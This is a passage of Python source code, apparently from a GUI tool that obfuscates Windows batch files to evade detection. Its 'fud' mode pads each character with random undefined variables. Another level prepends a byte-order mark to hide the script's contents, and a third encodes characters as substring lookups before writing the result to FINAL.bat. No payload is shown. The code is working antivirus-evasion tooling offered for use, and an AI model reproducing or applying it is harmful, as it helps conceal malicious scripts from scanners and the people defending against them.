                                var = f"%KDOT:~{random_order.index(char)},1%"
                                f.write(var)
                            else:
                                f.write(char)
                                
    def level3(self):
        out_hex = []

        #lowkey overkill lmao
        out_hex.extend(["FF", "FE", "26", "63", "6C", "73", "0D", "0A", "FF", "FE", "0A", "0D"])
        with open('holder.bat', 'w') as f:
            f.write(self.code)
        with open('holder.bat', 'rb') as f:
            penis = f.read()

        out_hex.extend(['{:02X}'.format(b) for b in penis])

        with open(f'main.level3.bat', 'wb') as f:
            self.name = f.name
            for i in out_hex:
                f.write(bytes.fromhex(i))
                
        remove('holder.bat')
            
    def all(self):
        names = []
        self.level2()
        self.file = "main.level2.bat"
        names.append(self.file)
        self.level1()
        self.file = f"main.level1.bat"
        names.append(self.file)
        self.level3()
        rename(f"main.level3.bat", "FINAL.bat")
        for name in names:
            remove(name)
        print("FINAL.bat is the finished product!")
        self.create_top_level("FINAL.bat is the finished product!")
        
    def fud(self):
        carrot = False
        var = False
        with open("main.fud.bat", "a+", encoding="utf-8") as f:
            f.write("::Made by K.Dot\n")
            self.name = f.name
            for line in self.code:
                for char in line:
                    if char == ">":
                        f.write(char)
                    elif char == "^":
                        f.write(char)
                        carrot = True
                    elif carrot == True:
                        f.write(char)
                        carrot = False
                    else:
                        if char == "%":
                            var = not var
                            f.write(char)
                            
                        elif var == True:
                            f.write(char)
                            
                        elif "\n" in char:
                            f.write(char)
                            
                        else:
                            random = self.make_random_string()
                            f.write(f"{char}%{random}%")
        
        
        
if __name__ == '__main__':
    Buidler().mainloop()